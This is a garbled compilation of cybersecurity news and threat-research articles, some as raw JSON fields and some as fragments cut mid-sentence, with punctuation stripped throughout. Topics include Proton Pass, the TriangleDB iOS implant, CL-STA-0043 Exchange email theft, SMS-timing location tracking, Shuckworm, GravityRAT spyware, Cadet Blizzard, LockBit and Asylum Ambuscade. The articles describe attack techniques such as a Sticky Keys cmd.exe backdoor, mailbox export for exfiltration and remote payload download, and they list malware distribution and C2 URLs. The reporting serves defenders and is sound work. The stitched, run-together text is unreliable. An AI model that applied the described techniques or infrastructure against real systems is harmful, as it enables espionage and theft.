        "text": "Proton AG has announced the global availability of Proton Pass an open-source and free-to-use password manager available as a browser extension or mobile app on Android and iOSmanagerProton Pass is the latest addition to the company's data and privacy-protection product portfolio giving users a secure end-to-end encrypted vault to store their passwords and notesApart from the password generation functionality a standard feature on all modern password managers Proton Pass will also enable users to create a hide-my-email aliasThis randomly generated email address acts as a relay point between the online service and your actual email account preventing service providers from identifying or tracking youThese email aliases also limit the repercussions of data breaches as the email address exposed in these cases will be unique to your account at a website making them useless to hackers to use in credential stuffing attacksCredential stuffing attacks are when threat actors use credentials leaked in data breaches to try and log into other sites owned by the exposed userAnother element that differentiates Proton Pass from other free password managers according to its creator is the use of strong bcrypt password hashing instead of problematic PBKDF2 implementations and a hardened implementation of Secure Remote Password SRP for authenticationMoreover contrary to other password managers that only encrypt the password field Proton Pass encrypts everything including the username web address and any other data the user saves on each itemThe vendor's assurances on the robust security architecture will soon be verified by independent auditors at Cure53 who are currently examining the software's code for weaknessesLastly Proton emphasizes its privacy-friendly Swiss jurisdiction as an advantage over other products implying that Swiss law enforcement authorities will only request user data reviews from the company in verified instances of illegal activityThe free version of Proton Pass gives users unlimited logins and encrypted notes but only provides ten hide-my-email aliases and only 2FA autofill for 3 loginsFor unlimited 2FA and private email addresses users must pay for Proton Pass Plus which costs 1month annual charge until the end of July 2023 After that date the product will have a regular price of 399Subscribers to Proton Unlimited Business Visionary or Family plans will get the premium version of Proton Pass without an additional chargeThe Proton team has promised to release desktop versions of Proton Pass for Windows and macOS but these are unavailable at this time"

exploitation chain as possible It took about half a year to accomplish that goal and after the collection of the chain had been completed we started an in-depth analysis of the discovered stages As of now we have finished analyzing the spyware implant and are ready to share the detailsThe Operation Triangulation infection chainThe implant which we dubbed TriangleDB is deployed after the attackers obtain root privileges on the target iOS device by exploiting a kernel vulnerability It is deployed in memory meaning that all traces of the implant are lost when the device gets rebooted Therefore if the victim reboots their device the attackers have to reinfect it by sending an iMessage with a malicious attachment thus launching the whole exploitation chain again In case no reboot occurs the implant uninstalls itself after 30 days unless this period is extended by the attackersThe TriangleDB implant is coded using Objective-C a programming language that preserves names of members and methods assigned by the developer In the implants binary method names are not obfuscated however names of class members are uninformative acronyms which makes it difficult to guess their meaningClass

implant are HEX-encoded and encrypted with rolling XORThe rolling XOR algorithm implemented in the implant for string decryptionOnce the implant launches it starts communicating with the C2 server using the Protobuf library for exchanging data The configuration of the implant contains two servers the primary and the fallback contained in the lS and lSf configuration fields Normally the implant uses the primary server and in case of an error it switches to the fallback server by invoking the -CRConfig swapLpServerType methodAdditionally the sent and received messages are encrypted with symmetric 3DES and asymmetric RSA cryptography All messages are exchanged via the HTTPS protocol in POST requests with the cookie having the key g and a value that is a digit string from the pubKI configuration parameterHeartbeat beacon snippet implant v1705 running on iOS 1531The C2 server responds to heartbeat messages with commands Commands are transferred as Protobuf messages that have type names starting with CRX The meaning of these names is obscure for example the command listing directories is called CRXShowTables and changing C2 server addresses is handled by the command

goal of the attacks was to obtain highly confidential and sensitive information specifically related to politicians military activities and ministries of foreign affairsThe attacks which happened around the same time frame shared several very unique similarities in tactics techniques and procedures TTPs with some of them never reported before in the wild while other techniques are relatively rare with just a handful of attackers reported using themWe currently track the activity group behind the attacks as CL-STA-0043 This activity groups level of sophistication adaptiveness and victimology suggest a highly capable APT threat actor and it is suspected to be a nation-state threat actorWhile tracking and analyzing CL-STA-0043 we discovered new evasive techniques and tools used by the attackers such as an in-memory VBS implant to run webshell clandestinely as well as a rare credential theft technique first seen in the wildPerhaps one of the most interesting findings of this investigation is the rare and novel Exchange email exfiltration technique that was used by the attackers only on a few selected targets according to our telemetryIn this blog post we will provide information regarding the various TTPs observed in the attacks including the execution as shown through the lens of the Palo Alto Networks Cortex XDR productIn most cases the main post exploitation method observed in such attacks is to deploy various kinds of webshell which provide the attackers access to the compromised network via a remote shellBelow is a snippet of the in-memory

mapping out the network and identifying critical assets The attackers were mainly focused on finding administrative accounts and identifying important servers such asTo get this information the attackers tried to execute the following toolsIn order to carry out the attacks successfully the threat actors needed to run their tools and commands with adequate privileges adminsystem To do so they made use of different tools from the trending Potato suite The Potato suite is a collection of various native Windows privilege escalation tools The main tools that were observed during the investigation wereUsing those tools the threat actor attempted to create administrative accounts and to run various tools that require elevated privilegesThe Windows operating system contains accessibility features that may be launched with a key combination before a user has logged in to the system or by an unprivileged user An attacker can modify the way these programs are launched to get a command prompt or a backdoorThere were multiple observed attempts to edit the registry key for sethcexe to point to cmdexe and subsequently run the sethcexe file with the parameter 211 This turns on the systems Sticky Keys feature which in return executes the elevated command prompt shellIn addition the attackers used a privilege escalation tool Iislpeexe which is an IIS privilege escalation tool written by k8gege the same author who created the aforementioned Ladon toolUsing this method the attackers executed a PowerShell script that registered a new network provider named

SQL penetration functions and it provides a range of database functionalities for the operator to perform remote actionsThe following Yasso modules were most in use during the attacksThe use of the different Yasso modules were detected in the Cortex XDR XSIAM product as shown in Figure 7Besides the use of Yasso for lateral movement the attackers were also observed using other common and known techniques to accomplish thatTo gather those emails two very unique methods were observedIn the first method we observed the abuse of the Exchange Management Shell exshellpsc1 to run a command that saved all emails from users that contain the string foreign and all emails sent from or to governmental accounts into csv filesIn addition to the command lines above other searches for specific content using the filter MessageSubject -like 'redacted' were observed as well Those searches were for very specific individuals and information related to highly sensitive stately and foreign policy mattersBelow is a snippet of the script which originally contained over 30 targeted mailboxes of individuals embassies military-related organizations and othersThe output of those scripts were saved into tiff files under cuserspublicredacted which were later compressed password-protected and sent to the attackers C2 server as wellIn this blog we uncovered several previously unreported and rare techniques and tools observed used by a cluster of activity we refer to as CL-STA-0043 While the research is still ongoing and the full identity of the threat actors is still being studied we believe that the level of sophistication determination and espionage motives demonstrated in this report bear the hallmarks of a true advanced persistent threat potentially operating on behalf of nation-state interests In the same vein this sheds light on how threat actors seek to obtain non-public and confidential information about geopolitical related topics and high-ranking public service individualsDuring the attacks Cortex XDR XSIAM raised many alerts for the malicious activities observed in CL-STA-0043 Prevention and detection alerts were raised for each phase of the attack the

        "text": "A team of university researchers has devised a new side-channel attack named 'Freaky Leaky SMS' which relies on the timing of SMS delivery reports to deduce a recipient's locationSMS delivery reports are handled by the SMSC short message service center of the mobile network to inform when a message has been delivered accepted failed is undeliverable has expired or has been rejectedWhile there are routing network node propagation and processing delays in this process mobile networks' fixed nature and specific physical characteristics result in predictable times when standard signal pathways are followedThe researchers developed a machine learning algorithm that analyzes timing data in these SMS responses to find the recipient's location at an accuracy of up to 96 for locations across different countries and up to 86 for two locations in the same countryThe attacker will first have to collect some measurement data to make concrete correlations between the SMS delivery reports and the known locations of their targetThe more precise data the attacker has about their targets' whereabouts the more accurate the location classification results in the ML model's predictions will be in the attack phaseTo collect the data the attacker must send multiple SMS to the target either masking them as marketing messages that the recipient will ignore or disregard as spam or using silent SMS messagesSilent SMS is a type 0 message with no content which produces no notifications on the target's screen yet its reception is still acknowledged by the device on the SMSCIn their experiments the authors of the paper used ADB to send bursts of 20 silent SMSes every hour for three days to multiple test devices in the United States United Arab Emirates and seven European countries covering ten operators and various communication technologies and generationsNext they measured the SMS delivery reports timing in each case and aggregated the data with the matching location signatures to generate a comprehensive ML evaluation datasetThe ML model used a total of 60 nodes 10 input 10 output 40 hidden and the training data also included receiving location connectivity conditions network type receiver distances and othersThe experiment focuses on closed world attack scenarios meaning the classification of the target's location on one of the pre-determined locationsThe academics found that their model achieved high accuracy in discerning between domestic and overseas locations 96 similarly good guesses in country classification 92 and reasonably good performance for locations within the same region 62-75Accuracy depends on the location operator and conditions For example in Germany the system had an average accuracy of 68 over 57 different classifications with the best performance being 92 in a specific German regionBelgium had the best results with an average of 86 correct guesses and a maximum of 95 in the best-performing regionWhen three locations are considered in Germany the model's prediction accuracy drops to an average of 54 and tops at 83 in the best-performing case which is still significantly higher than the 33 of random guessingFor Greece the model delivered a notable average of 79 correct location predictions for three locations random 33 and reached 82 in the best caseIn short open-world attacks are feasible based on the use of probability outputs anomaly detection and including landmarks and other locations of interest in the ML training dataset However the scale of the attack grows exponentially and the scope is beyond the present paperAlthough the attack involves tedious preparatory work isn't trivial to carry out does not work well under all circumstances and has several practical limitations it still constitutes a potential privacy risk for usersOne of the researchers signing the paper Evangelos Bitsikas told BleepingComputer that for this experiment they considered themselves baseline attackers meaning that they were restricted in terms of resources machine learning knowledge and technical capacityThis means that sophisticated attackers with more resources in their hands could theoretically achieve more impact and even enjoy moderate success in the open world attack scenarios"

        "text": "The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine with recent targets including security services military and government organizationsIn some cases Shuckworm has succeeded in staging long-running intrusions lasting for as long as three months The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members enemy engagements and air strikes arsenal inventories military training and moreIn a bid to stay ahead of detection Shuckworm has repeatedly refreshed its toolset rolling out new versions of known tools and short-lived infrastructure along with new additions such as USB propagation malwareShuckworm aka Gamaredon Armageddon is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014 Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service FSBShuckworm is known to use phishing emails as an initial infection vector in order to gain access to victim machines and distribute malware The attackers send emails with malicious attachments to Ukrainian victims with the attachments of various file types such asThe victim lures we observed related to armed conflicts criminal proceedings combating crime and protection of children among othersOnce victims were infected the attackers then proceed to download additional backdoors and tools onto targeted machinesExamples of recent scheduled tasks include execution of the following command linesThe new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using an rtklnk extension The script uses file names such as pornvideortflnk donotdeletertflnk and evidencertflnk in an attempt to entice individuals to open the files These file names are generally in Ukrainian but some are also in EnglishNext the script enumerates all drives copying itself to any available removable disks USB drives These USB drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizationsIn this recent activity we also observed the group leveraging legitimate services to act as CC servers including using the Telegram messaging service for its CC infrastructure More recently they have also used Telegrams micro-blogging platform called Telegraph to store CC addressesShuckworm tends to only use its CC infrastructure for short periods of time limiting the usefulness of its CCs when it comes to finding more activity or linking activity together However the group does use SSL certificates that have some commonalities that may be leveraged for tracking purposes We believe the group is likely leveraging pre-configured images for use in its CC deployment These data points can help researchers to identify additional CC infrastructure and Shuckworm activitySymantec also saw what was likely Giddome an infostealer tool that is a known Shuckworm backdoor deployed onto victim networks to steal and exfiltrate data of interestThe following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaignIn one attack the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious documentAfter the document was opened a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers CC serverMore recently Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts This is likely an attempt to evade some tracking methods employed by researchersShuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection with up to 25 new variants of the groups scripts observed per month between January and April 2023Next a VBS script which was Shuckworms Pterodo backdoor was executedFollowing this we saw what appeared to be multiple similar scripts being executed The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departmentsOn a different machine we saw malicious activity that appeared to be executed from a file fotosafe that had been dropped by an infected USB key that someone had plugged into the system Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key eg usb- translates as usb-driveThe fotosafe file is a Base64-encoded

research and government organizations The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts The majority of these attacks began in FebruaryMarch 2023 with the attackers maintaining a presence on some of the victim machines until May The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information There were indications in some organizations that the attackers were on the machines of the organizations human resources departments indicating that information about individuals working at the various organizations was a priority for the attackers among other thingsThis activity demonstrates that Shuckworms relentless focus on Ukraine continues It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in

        "text": "Award-winning news views and insight from the ESET security community Award-winning news views and insight from the ESET security community ESET ResearchESET researchers analyzed an updated version of Android GravityRAT spyware that steals WhatsApp backup files and can receive commands to delete files15 Jun 2023 9 min readKey points of this blogpostWe discovered a new version of Android GravityRAT spyware being distributed as trojanized versions of the legitimate open-source OMEMO Instant Messenger Android appThe trojanized BingeChat app is available for download from a website that presents it as a free messaging and file sharing serviceThis version of GravityRAT is enhanced with two new capabilities receiving commands to delete files and exfiltrating WhatsApp backup filesFigure 1 Distribution website of the malicious BingeChat messaging appThe website should provide the malicious app after tapping the DOWNLOAD APP button however it requires visitors to log in We didnt have credentials and registrations were closed see Figure 2 It is most probable that the operators only open registration when they expect a specific victim to visit possibly with a particular IP address geolocation custom URL or within a specific timeframe Therefore we believe that potential victims are highly targetedFigure 2 The service currently doesnt provide registrationsAlthough we couldnt download the BingeChat app via the website we were able to find a URL on VirusTotal httpsdownloadsbingechatnetuploadAc1d8bad13c5359c97cab280f7b561389153BingeChatzip that contains the malicious BingeChat Android app This app has the same hash as the app in the previously mentioned tweet which means that this URL is a distribution point for this particular GravityRAT sampleThe same domain name is also referenced within the code of the BingeChat app another hint that bingechatnet is used for distribution see Figure 3Figure 3 Distribution domain name referenced in the BingeChat appFigure 4 Log generated by the HTTrack tool and recorded in the malicious distribution websites HTML codeWe do not know how potential victims were lured to or otherwise discovered the malicious website Considering that downloading the app is conditional on having an account and new account registration was not possible for us we believe that potential victims were specifically targeted The attack overview scheme is shown in Figure 5Figure 5 GravityRAT distribution mechanismESET telemetry data has not recorded any victims of this BingeChat campaign further suggesting that the campaign is probably narrowly targeted However our telemetry has one detection of another Android GravityRAT sample in India that occurred in June 2022 In this case GravityRAT was branded as Chatico see Figure 6Figure 6 The login activity screen of ChaticoLike BingeChat Chatico is based on the OMEMO Instant Messenger app and trojanized with GravityRAT Chatico was most likely distributed through the chaticocouk website and also communicated with a CC server The domains for both the website and CC server are now offlineFrom here on out we will only focus on the active campaign using the BingeChat app which has the same malicious functionality as ChaticoFigure 7 Comparison of the class names for the trojan masquerading as legit SoSafe Chat left and BingeChat right appsAfter launch the app requests the user to allow all the necessary permissions to work properly as shown in Figure 8 Except for permission to read the call logs the other requested permissions are typical of any messaging application so the device user might not be alarmed when the app requests themFigure 8 Permissions requested by BingeChatAs part of the apps legitimate functionality it provides options to create an account and log in Before the user signs into the app GravityRAT starts to interact with its CC server exfiltrating the device users data and waiting for commands to execute GravityRAT is capable of exfiltratingData to be exfiltrated is stored in text files on external media then exfiltrated to the CC server and finally removed The file paths for the staged data are listed in Figure 9Figure 9 File paths to data staged for exfiltrationThis version of GravityRAT has two small updates compared to previous publicly known versions of GravityRAT First it extends the list of files to exfiltrate to those with the crypt14 crypt12 crypt13 crypt18 and crypt32 extensions These crypt files are encrypted backups created by WhatsApp Messenger Second it can receive three commands from a CC server to executeThese are very specific commands that are not typically seen in Android malware Previous versions of Android GravityRAT could not receive commands at all they could only upload exfiltrated data to a CC server at a particular timeGravityRAT contains two hardcoded CC subdomains shown in Figure 10 however it is coded to use only the first one httpsdevandroidadbservercomFigure 10 Hardcoded initial CC serversThis CC server is contacted to register a new compromised device and to retrieve two additional CC addresses httpscldandroidadbservercom and httpspingandroidadbservercom when we tested it as shown in Figure 11Figure 11 CC communication to register a new deviceAgain only the first CC server is used this time to upload the device users data as seen in Figure 12Figure 12 Victim data exfiltration to CC serverAccording to ESET telemetry a user in India was targeted by the updated Chatico version of the RAT similar to previously documented SpaceCobra campaigns The BingeChat version is distributed through a website that requires registration likely open only when the attackers expect specific victims to visit possibly with a particular IP address geolocation custom URL or within a specific timeframe In any case we believe the campaign is highly targetedSHA-1Package

        "text": "As Russias invasion of Ukraine continues into its second year and Microsoft continues to collaborate with global partners in response the exposure of destructive cyber capabilities and information operations provide greater clarity into the tools and techniques used by Russian state-sponsored threat actors Throughout the conflict Russian threat actors have deployed a variety of destructive capabilities with varying levels of sophistication and impact which showcase how malicious actors rapidly implement novel techniques during a hybrid war along with the practical limitations of executing destructive campaigns when significant operational errors are made and the security community rallies around defense These insights help security researchers continuously refine detection and mitigation capabilities to defend against such attacks as they evolve in a wartime environmentBLIZZARDMicrosoft has tracked Cadet Blizzard since the deployment of WhisperGate in January 2022 We assess that they have been operational in some capacity since at least 2020 and continue to perform network operations through the present Operationally consistent with the remit and assessed objectives of GRU-led operations throughout Russias invasion of Ukraine Cadet Blizzard has engaged in focused destructive attacks espionage and information operations in regionally significant areas Cadet Blizzards operations though comparatively less prolific in both scale and scope to more established threat actors such as Seashell Blizzard are structured to deliver impact and frequently run the risk of hampering continuity of network operations and exposing sensitive information through targeted hack-and-leak operations Primary targeted sectors include government organizations and information technology providers in Ukraine although organizations in Europe and Latin America have also been targetedCadet Blizzard compromises and maintains a foothold on affected networks for months often exfiltrating data prior to disruptive actions Microsoft observed Cadet Blizzards activity peak between January and June 2022 followed by an extended period of reduced activity The group re-emerged in January 2023 with increased operations against multiple entities in Ukraine and in Europe including another round of website defacements and a new Free Civilian Telegram channel affiliated with the hack-and-leak front under the same name that first emerged in January 2022 around the same time as the initial defacements Cadet Blizzard actors are active seven days of the week and have conducted their operations during their primary European targets off-business hours Microsoft assesses that NATO member states involved in providing military aid to Ukraine are at greater riskCadet Blizzard seeks to conduct disruption destruction and information collection using whatever means are available and sometimes acting in a haphazard fashion While the group carries high risk due to their destructive activity they appear to operate with a lower degree of operational security than that of longstanding and advanced Russian groups such as Seashell Blizzard and Forest Blizzard Additionally as is the case with other Russian state-sponsored threat groups Microsoft assesses that at least one Russian private sector organization has materially supported Cadet Blizzard by providing operational support including during the WhisperGate destructive attackCadet Blizzards operations are global in scope but consistently affect regional hotspots in Ukraine Europe Central Asia and periodically Latin America Cadet Blizzard likely prioritizes target networks based on requirements consistent with Russian military or intelligence objectives such as geolocation or perceived impact Cadet Blizzard consistent with a Russian military-associated threat actor continues to mainly target Ukraine although the relative scope of impact of Cadet Blizzards destructive activity is minimal compared to the multiple waves of destructive attacks that we attribute to Seashell Blizzard In January 2022 Cadet Blizzard launched destructive attacks in Ukraine in the following industry verticalsCadet Blizzard has repeatedly targeted information technology providers and software developers that provide services to government organizations using a supply chain compromise one compromise many technique The groups January 2022 compromise of government entities in Ukraine probably were at least in part due to access and information gained during a breach of an information technology provider that often worked with these organizationsPrior to the war in Ukraine Cadet Blizzard performed historical compromises of several Eastern European entities as well primarily affecting the government and technology sectors as early as April 2021 As the war continues Cadet Blizzard activity poses an increasing risk to the broader European community specifically any successful attacks against governments and IT service providers which may give the actor both tactical and strategic-level insight into Western operations and policy surrounding the conflict Gaining heightened levels of access into these targeted sectors may also enable Cadet Blizzard to carry out retaliatory demonstrations in opposition to the Wests support for UkraineCadet Blizzard is a conventional network operator and commonly utilizes living-off-the-land techniques after gaining initial access to move laterally through the network collect credentials and other information and deploy defense evasion techniques and persistence mechanisms Unlike other Russian-affiliated groups that historically prefer to remain undetected to perform espionage the result of at least some notable Cadet Blizzard operations are extremely disruptive and are almost certainly intended to be public signals to their targets to achieve the larger objective of destruction disruption and possibly intimidationInitial accessCadet Blizzard predominantly achieves initial access through exploitation of web servers commonly found on network perimeters and DMZs Cadet Blizzard is also known for exploiting Confluence servers through the CVE-2021-26084 vulnerability Exchange servers through multiple vulnerabilities including CVE-2022-41040 and ProxyShell and likely commodity vulnerabilities in various open-source platforms such as content management systemsPersistencePrivilege escalation and credential harvestingCadet Blizzard has leveraged a variety of living-off-the-land techniques to conduct privilege escalation and harvesting of credentialsCommand executionand C2Cadet Blizzard periodically uses generic socket-based tunneling utilities to facilitate command and control C2 to actor-controlled infrastructure Payloads such as NetCat and Go Simple Tunnel GOST are commonly renamed to blend into the operating system but are used to shovel interactive command prompts over established sockets Frequently remote command execution may be facilitated through remotely scheduled tasks The group has also sparingly utilized MeterpreterOperational securityCadet Blizzard utilizes anonymization services IVPN SurfShark and Tor as their anonymization layerduring select operationsAnti-forensicsCadet Blizzard has been observed leveraging theWin32NTEventlogFile commandlet in PowerShell to extract both system and security event logs to an operational directory The activities are anticipated to be consistent with anti-forensics activitiesImpact assessmentCadet Blizzard typically collects information en-masse from targeted servers If mail servers are affected Cadet Blizzard typically attempts to collect mail placing incident response communications at risk Credential material such as SSH keys are also a common target to provide methods for re-entry if a full remediation does not occur As was the case with the WhisperGate operation in January 2022 Cadet Blizzard is known to deploy destructive malware to select target environments to delete data and render systems inoperableAlso in January of 2022 Microsoft identified that data exfiltrated by Cadet Blizzard in compromises of various Ukrainian organizations was leaked on a Tor onion site under the name Free Civilian The organizations from which data was leaked strongly correlated to multiple Cadet Blizzard compromises earlier in 2022 leading Microsoft to assess that this forum is almost certainly linked to Cadet Blizzard In February 2023 a new Telegram channel was established under the same Free Civilian moniker suggesting that Cadet Blizzard intends to continue conducting information operations in the second year of the war However the public channel only has 13K followers with posts getting at most a dozen reactions as of the time of publication signifying low user interaction A private channel assumed to be operated by the same group appears to have shared data with 748 of those subscribersCadet Blizzard operations do not occur in a silo there have been substantial technical indicators of intersection with other malicious cyber activity that may have a broader scope or a nexus outside of Russia They have at times utilized services associated with these ecosystems such as Storm-0587 discussed below as well as having support from at least one private sector enabler organization within Russia Though there have been various forms of intersections in threat activity when these groups have been observed operating independently the tactics techniques procedures TTPs and capabilities have often been distincttherefore making it operationally valuable to distinguish these activity groupsStorm-0587Activities linked to Cadet Blizzard indicate that they are comprehensive in their approach and have demonstrated an ability to hold networks at risk of continued compromise for an extended period of time A comprehensive approach to incident response may be required in order to fully remediate from Cadet Blizzard operations Organizations can bolster security of information assets and expedite incident response by focusing on areas of risk based on actor tradecraft enumerated within this report Use the included indicators of compromise to investigate environments and assess for potential intrusionTo

        "text": "About one in every six ransomware attacks targeting US government offices in 2022 can be traced back to a single group LockBitCybersecurity agencies around the world said Wednesday that the LockBit gang which has links to Russia is one of the biggest cybersecurity threats that governments and other organizations faceThe agencies said LockBit has claimed responsibility for at least 1653 ransomware attacks based on victims posted to its leak siteThe gang has brought in about 91 million in ransoms from US victims since its first reported attack in the country in January 2020Each country provided its own statistics illustrating LockBits unparalleled attack frequency with Australia noting that in the last year the gang made up 18 of total reported ransomware incidents In Canada and New Zealand meanwhile LockBit was responsible for just over 1 in every 5 attacks last yearFrance said 11 of the attacks it has seen since 2020 involved LockBit but noted that in a portion of the cases it was not able to confirm nor deny the breach of victim networks basing it solely on the gangs leak site postingIn the US the group accounted for 16 of attacks on public entities which include municipal and county governments public higher education and K-12 schools as well as on emergency services like law enforcement agenciesRansomware is one of the most severe cyber threats for government businesses and society said Gerhard Schabhueser acting president for Germanys Federal Office for Information Security BSIAmongst those actors guided by financial motivations the Ransomware-as-a-Service LockBit is currently the most menacing in Germany as well as globally We reiterate our call to all organizations to take appropriate action and increase their resilienceThe advisory lays out several tactics and vulnerabilities typically exploited by the group during attacks and notes that part of the gangs success is in its use of affiliates which find diverse ways to breach organizationsAccording to the agencies the group allows affiliates to receive ransom payments and then send the developers their cut a practice that stands in stark contrast to other RaaS groups who pay themselves first and then disburse the affiliates cutLockBit has participated in several publicity-generating stunts like paying people to get tattoos of their insignia and running bug bounty programs for their ransomwareThe group has also created a simplified interface that allows less technically-skilled hackers to simply point-and-click during attacks LockBit has evolved significantly over time releasing 20 and 30 versions since 2021LockBit 30 known as LockBit Black incorporates tooling from BlackMatter and Alphv ransomware strains while the LockBit Green strain released in January 2023 incorporates source code from the now-defunct Conti ransomwareAccording to the agencies the introduction of LockBit 20 in mid-2021 had an immediate impact on the cybercriminal market as it coincided with the demise of multiple RaaS operations like DarkSide and AvaddonLockBit competed with other RaaS operations like Hive RaaS to fill the gap in the cybercriminal market leading to an influx of LockBit affiliates they saidSeveral affiliates have also used more popular vulnerabilities like Log4j during attacks The advisory includes a list of about 30 tools used by the hackers and more information on the gangs modus operandiLockBit is one of the most prolific and disruptive ransomware variants having been used by cybercriminals against multiple sectors and organizations worldwide including in Australia said Abigail Bradshaw head of the Australian Cyber Security Centre With ransomware variants constantly evolving this advice can help organizations strengthen and defend their networksSeveral cybersecurity experts said LockBit has stood out from its competitors in recent years by constantly improving its modelSean McNee vice president of research and data at cybersecurity firm DomainTools said the group has professionalized its business model and now actively advertises on online forums to beef up its affiliate networkOthers noted that the groups ability to dumb down the ransomware attack process was LockBits most worrying development The gang has lowered the barrier for entry significantly said Dror Liwer co-founder of the AI-based cybersecurity company CoroNow that the barrier of entry has been lowered and the attack cost has been commoditized the ROI of attacks against mid-market and small organizations has improved greatly leading attackers to target these much more vulnerable organizations who do not have the same security stack or teams protecting them as the Fortune 500 do Liwer saidTom Kellermann a former Obama administration cybersecurity official added that LockBit has been able to help Russia offset some Western economic sanctions through its increased number of ransomware attacks affiliating itself with cybercrime cartels that enjoy a pax mafiosa with the Russian governmentJonathan Greig is a Breaking News Reporter at Recorded Future News Jonathan has worked across the globe as a journalist since

actor at the border between crimeware and cyberespionage08 Jun 2023 19 min readKey points of this blogpostAsylum Ambuscade has been operating since at least 2020It is a crimeware group that targets bank customers and cryptocurrency traders in various regions including North America and EuropeAsylum Ambuscade also does espionage against government entities in Europe and Central AsiaMost of the groups implants are developed in script languages such as AutoHotkey JavaScript Lua Python and VBSAsylum Ambuscade has been running cyberespionage campaigns since at least 2020 We found previous compromises of government officials and employees of state-owned companies in Central Asia countries and ArmeniaIn 2022 and as highlighted in the Proofpoint publication the group targeted government officials in several European countries bordering Ukraine We assess that the goal of the attackers was to steal confidential information and webmail credentials from official government webmail portalsThe compromise chain starts with a spearphishing email that has a malicious Excel spreadsheet attachment Malicious VBA code therein downloads an MSI package from a remote server and installs SunSeed a downloader written in LuaFigure 1 Document leveraging the Follina vulnerabilityThen if the machine is deemed interesting the attackers deploy the next stage AHKBOT This is a downloader written in AutoHotkey that can be extended with plugins also written in AutoHotkey in order to spy on the victims machine An analysis of the groups toolset is provided later in the blogpostEven though the group came into the spotlight because of its cyberespionage operations it has been mostly running cybercrime campaigns since early 2020Since January 2022 we have counted more than 4500 victims worldwide While most of them are located in North America as shown in Figure 2 it should be noted that we have also seen victims in Asia Africa Europe and South AmericaFigure 2 Geographical distribution of victims since January 2022The targeting is very wide and mostly includes individuals cryptocurrency traders and small and medium businesses SMBs in various verticalsWhile the goal of targeting cryptocurrency traders is quite obvious stealing cryptocurrency we dont know for sure how Asylum Ambuscade monetizes its access to SMBs It is possible the group sells the access to other crimeware groups who might for example deploy ransomware We have not observed this in our telemetry thoughAsylum Ambuscades crimeware compromise chain is overall very similar to the one we describe for the cyberespionage campaigns The main difference is the compromise vector which can beFigure 3 404 TDS redirection chain as captured by urlscanio numbers indicate the redirections in sequenceIn addition to the different compromise vector the group developed SunSeed equivalents in other scripting languages such as Tcl and VBS In March 2023 it developed an AHKBOT equivalent in Nodejs that we named NODEBOT We believe those changes were intended to bypass detections from security products An overview of the compromise chain is provided in Figure 4Figure 4 Compromise chainWe believe that the cyberespionage and cybercrime campaigns are operated by the same groupAs such we believe that Asylum Ambuscade is a cybercrime group that is doing some cyberespionage on the sideWe also believe that these three articles describe incidents related to the groupIn most crimeware campaigns run by the group the compromise vector is not a malicious document but a JavaScript file downloaded from the previously documented TDS Note that it has to be manually executed by the victim so the attackers are trying to entice people into clicking on the files by using filenames such as Document12dec-1532825js TeamViewerSetupjs or AnyDeskInstalljsThose scripts are obfuscated using random variable names and junk code most likely intended to bypass detections An example is provided in Figure 5Figure 5 Obfuscated JavaScript downloaderOnce deobfuscated this script can be summarized in two linesThe first stage downloaders are dropped by an MSI package downloaded by either a malicious document or a JavaScript file There are three versions of this downloaderSunSeed is a downloader written in the Lua language and heavily obfuscated as shown in Figure 6Figure 6 The SunSeed Lua variant is heavily obfuscatedOnce manually deobfuscated the main function of the script looks like thisIt gets the serial number of the C drive and sends a GET request to httpCCserialnumber using the User-Agent LuaSocket 202 It then tries to execute the reply This means that SunSeed expects to receive additional Lua scripts from the CC server We found two of those scripts install and moveinstall is a simple Lua script that downloads an AutoHotkey script into CProgramDatamscoreeahk and the legitimate AutoHotkey interpreter into CProgramDatamscoreeexe as shown in Figure 7 This AutoHotkey script is AHKBOT the second stage downloaderFigure 7 Lua script that downloads an AutoHotkey scriptAn even simpler Lua script move is shown in Figure 8 It is used to reassign management of a victimized computer from one CC server to another It is not possible to update the hardcoded SunSeed CC server to complete a CC reassignment a new MSI installer needs to be downloaded and executed exactly as when the machine was first compromisedFigure 8 Lua script to move management of a compromised machine from one CC server to anotherAs mentioned above we found another variant of SunSeed developed using the Tcl language instead of Lua as shown in Figure 9 The main difference is that it doesnt send the C drives serial number in the GET requestFigure 9 SunSeed variant in TclThe third variant was developed in VBS as shown in Figure 10 The main difference is that it doesnt download and interpret additional code but downloads and executes an MSI packageFigure 10 SunSeed variant in VBSThe main second-stage downloader is AHKBOT developed in AutoHotkey As shown in Figure 11 it sends a GET request with the User-Agent AutoHotkey the default value used by AutoHotkey to httpCCserialnumberofCdrive-RP almost exactly as the earlier SunSeed RP might be a campaign identifier as it changes from sample to sampleFigure 11 AHKBOTAHKBOT can be found on disk at various locations such as CProgramDatamscoreeahk or CProgramDataadbahk It downloads and interprets spy plugins also developed in AutoHotkey A summary of the 21 plugins is provided in Table 1Table 1 SunSeed pluginsand send to the CC serverThis plugin looks very similar to the password stealer described by Trend Micro in 2020 including the hard drive serial numbers used for debugging 605109072 and 2786990575 This could indicate that it is still being developed on the same machinesThe plugins send the result back to the CC server using a log function as shown in Figure 12Figure 12 Log functionIn March 2023 the attackers developed a variant of AHKBOT in Nodejs that we have named NODEBOT see Figure 13Figure 13 NODEBOTThe attackers also rewrote some AHKBOT plugins in JavaScript to make them compatible with NODEBOT So far we have observed the following plugins an asterisk indicates that the plugin is new to NODEBOTAsylum Ambuscade is a cybercrime group mostly targeting SMBs and individuals in North America and Europe However it appears to be branching out running some recent cyberespionage campaigns on the side against governments in Central Asia and Europe from time to timeIt is quite unusual to catch a cybercrime group running dedicated cyberespionage operations and as such we believe that researchers 